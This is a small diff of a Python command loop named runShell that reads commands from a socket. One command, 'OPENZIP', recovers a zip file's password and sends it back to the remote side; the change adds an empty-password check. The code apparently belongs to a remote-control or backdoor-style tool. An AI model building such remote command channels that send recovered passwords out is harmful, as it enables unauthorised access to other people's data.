@@ -19,7 +19,10 @@ def runShell(socketHolder):
 			incomingFile(socketHolder)
 		elif data == "OPENZIP":
 			password = openZip()
-			socketHolder.send(password)
+			if not password:
+				return
+			else:
+				socketHolder.send(password)
 		elif data == "EXIT":
 			socketHolder.send('EXIT')
 			socketHolder.close()
